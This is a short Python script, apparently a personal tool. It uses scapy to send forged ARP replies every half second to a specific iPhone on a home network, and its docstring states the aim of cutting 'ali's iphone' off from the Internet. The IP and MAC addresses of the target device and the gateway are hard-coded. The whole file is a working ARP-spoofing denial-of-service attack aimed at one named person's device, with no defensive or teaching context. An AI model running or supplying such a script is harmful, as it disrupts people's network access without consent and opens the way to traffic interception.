#coding:utf-8
'''
make ali's iphone not to connect to Internet
'''
from scapy.all import ARP,send,arping
import sys,re
import time
pretend_hw = '8c:a9:82:29:2d:6f'
# gateway_hw = 'f0:eb:d0:0b:11:48'
iphone_hw = '94:94:26:28:52:C3'
gateway_ip = '192.168.1.1'
iphone_ip = '192.168.1.104'
p=ARP(op = 2, hwsrc = pretend_hw, psrc = gateway_ip)

while True:
    t=p
    t.hwdst=iphone_hw
    t.pdst=iphone_ip
    send(t)
    time.sleep(0.5)